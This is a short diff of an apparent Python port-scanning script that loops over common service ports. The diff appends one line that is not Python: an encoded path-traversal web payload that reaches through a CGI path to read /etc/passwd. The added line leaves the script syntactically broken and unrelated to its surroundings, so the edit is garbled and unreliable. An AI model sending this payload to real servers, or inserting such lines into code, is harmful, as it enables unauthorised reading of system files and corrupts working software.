@@ -19,3 +19,4 @@ if __name__ == "__main__":
     ports = [21, 22, 23, 80, 443, 8080]
     for port in ports:
         scan_port(host, port)
+/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
